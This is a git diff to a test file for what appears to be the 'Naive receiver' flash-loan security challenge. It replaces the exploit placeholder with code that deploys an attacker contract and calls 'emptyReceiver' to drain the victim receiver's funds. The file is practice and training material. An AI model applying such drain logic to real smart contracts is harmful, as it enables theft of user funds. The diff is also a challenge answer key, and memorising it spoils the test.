@@ -6,6 +6,8 @@ const FlashLoanReceiver = contract.fromArtifact('FlashLoanReceiver');
 
 const { expect } = require('chai');
 
+const AttackerNaiveReceiver = contract.fromArtifact('AttackerNaiveReceiver');
+
 describe('[Challenge] Naive receiver', function () {
 
     const [deployer, user, attacker, ...otherAccounts] = accounts;
@@ -31,7 +33,8 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        this.attacker = await AttackerNaiveReceiver.new(this.pool.address, { from: attacker });
+        await this.attacker.emptyReceiver(this.receiver.address)
     });
 
     after(async function () {
